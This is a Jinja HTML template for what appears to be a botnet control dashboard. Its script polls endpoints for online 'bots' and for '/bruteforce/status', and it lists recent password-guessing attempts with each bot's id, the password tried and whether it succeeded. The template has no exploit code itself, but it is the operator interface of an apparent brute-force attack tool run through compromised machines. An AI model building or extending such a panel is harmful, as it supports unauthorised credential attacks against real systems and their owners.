{% extends "base.html" %}
{% block title %}Home{% endblock %}
{% block content %}
<div class="page-title">Dashboard Overview</div>
<div class="grid-4">
    <div class="stat-box"><div class="num blue" id="statBots">0</div><div class="label">Online Nodes</div></div>
    <div class="stat-box"><div class="num white" id="statTotal">0</div><div class="label">Total Nodes</div></div>
    <div class="stat-box"><div class="num green" id="statSuccess">0</div><div class="label">Success</div></div>
    <div class="stat-box"><div class="num red" id="statFail">0</div><div class="label">Failed</div></div>
</div>
<div class="card" style="margin-top:20px;">
    <div class="card-title">Recent Activity</div>
    <div id="recentLog" style="font-family:monospace; font-size:13px; color:#8b949e;">No recent activity.</div>
</div>
<script>
    async function fetchStats() {
        try {
            const r = await fetch('/api/active_bots');
            const bots = await r.json();
            document.getElementById('statBots').innerText = bots.filter(b => b.online).length;
            document.getElementById('statTotal').innerText = bots.length;
        } catch(e) {}
        try {
            const r = await fetch('/bruteforce/status');
            const data = await r.json();
            document.getElementById('statSuccess').innerText = data.success || 0;
            document.getElementById('statFail').innerText = data.failed || 0;
            if (data.results && data.results.length) {
                const last = data.results.slice(-5);
                document.getElementById('recentLog').innerHTML = last.map(l => 
                    `<div style="padding:5px 0; border-bottom:1px solid #21262d; display:flex; gap:15px;">
                        <span style="color:#8b949e;">${l.time}</span>
                        <span style="color:#f0f6fc;">${l.bot_id}</span>
                        <span>${l.password}</span>
                        <span style="color:${l.success ? '#3fb950' : '#f85149'};">${l.success ? '✅' : '❌'}</span>
                    </div>`
                ).join('');
            }
        } catch(e) {}
    }
    setInterval(fetchStats, 3000);
    fetchStats();
</script>
{% endblock %}
